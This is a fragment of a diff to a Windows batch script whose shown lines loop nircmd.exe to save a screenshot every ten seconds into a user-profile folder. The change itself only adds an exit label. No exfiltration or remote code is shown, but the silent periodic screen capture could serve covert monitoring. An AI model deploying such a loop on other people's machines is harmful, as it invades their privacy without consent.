@@ -17,3 +17,6 @@ if exist %screenshots% (
 cd %userprofile%\nircmd-x64 & nircmd.exe savescreenshot %screenshots%\%random%.png & timeout /t 10 > nul & goto :screenshots) else (
 if not exist %userprofile%\nircmd-x64\screenshots (mkdir %screenshots% & goto :screenshots)
 )
+goto :exit
+:exit
+exit
